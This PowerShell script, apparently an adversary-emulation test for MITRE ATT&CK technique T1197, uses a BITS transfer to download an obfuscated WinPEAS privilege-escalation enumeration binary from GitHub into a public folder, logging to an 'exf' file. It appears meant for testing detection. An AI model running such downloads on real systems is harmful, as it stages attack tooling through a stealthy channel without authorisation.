# Donwload WinPeas using Bitsadmin
# Technic ID : T1197
Clear-Host
Write-Output "==============================================================================="
Write-Output "BITS Job : Donwload WINPEAS using Bitsadmin (T1197)"
Write-Output "==============================================================================="
#
$exf_file ="$env:PUBLIC\exf\Bits_WinPEAS.txt"; 
$DownLoadSource = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
$DestDir = "$env:PUBLIC\Toolz\"
$DestFile = "winPEASany_ofs.exe"
$FullDest = $DestDir + $DestFile
try {
    Start-BitsTransfer -Source $DownLoadSource -Destination $FullDest -DisplayName "Donwload_Process" -Description "Downloading a complied file From the Internet" -Priority Foreground
    Write-Output "Added WinPEAS Download to Bits !" | Out-File -FilePath "$exf_file" -Encoding ascii -Append
}
catch {
    Write-Output "Error during Download : $($_.Exception.Message)" | Out-File -FilePath "$exf_file" -Encoding ascii -Append    
}
